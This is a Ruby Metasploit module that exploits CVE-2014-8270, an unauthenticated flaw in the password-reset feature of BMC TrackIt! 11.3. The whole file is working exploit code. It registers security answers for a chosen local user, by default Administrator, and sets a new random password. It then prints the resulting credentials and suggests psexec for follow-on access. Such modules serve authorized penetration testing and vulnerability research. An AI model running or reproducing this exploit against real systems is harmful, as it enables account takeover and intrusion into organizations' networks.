##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary Local User Password Change',
      'Description'    => %q{
      This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3
      and possibly prior versions.
      },
      'References'     =>
        [
          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-419/'],
          ['CVE', '2014-8270']
        ],
      'Author'         =>
        [
          'bperry', #discovery/metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 9 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),
        OptString.new('LOCALUSER', [true, 'The local user to change password for', 'Administrator']),
        OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\'s computer name will be autodetected', ''])
      ], self.class)
  end

  def localuser
    datastore['LOCALUSER']
  end

  def run_host(ip)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'PasswordReset'),
    )

    unless res
      print_error("#{peer}: Could not contact server")
      return
    end

    cookies = res.get_cookies
    domain = $1 if res.body =~ /"domainName":"(.*)"\}\);/
    domain = datastore['DOMAIN'] if datastore['DOMAIN'] != ''

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'domainname' => domain,
        'userName' => localuser,
        'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
        'userQuestions' => '[{"Id":1,"Answer":"not"},{"Id":2,"Answer":"not"}]',
        'updatequesChk' => 'false',
        'SelectedQuestion' => 1,
        'SelectedQuestion' => 2,
        'answer' => 'not',
        'answer' => 'not',
        'confirmanswer' => 'not',
        'confirmanswer' => 'not'
      }
    )

    if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
      print_error("#{peer}: Could not register the #{localuser} user")
      return
    end

    password = Rex::Text.rand_text_alpha(10) + "!1"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'newPassword' => password,
        'domain' => domain,
        'UserName' => localuser,
        'CkbResetpassword' => 'true'
      }
    })

    if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
      print_error("#{peer}: Could not change #{localuser}'s password -- is it a domain or local user?")
      return
    end

    print_good("#{peer} Please run the psexec module using #{domain}\\#{localuser}:#{password}")
  end
end
